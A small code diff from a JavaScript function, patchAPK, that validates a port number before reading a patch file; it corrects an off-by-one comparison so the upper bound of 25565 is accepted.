@@ -33,7 +33,7 @@ function patchAPK(URI, PORT, cb) {
     let portInt = parseInt(PORT);
     if (isNaN(portInt) || portInt < 2048 || portInt > 25565) return cb('Invalid Port');
 
-    if (portInt < 25565) {
+    if (portInt <= 25565) {
         fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
             if (err) return cb('File Patch Error - READ')
             
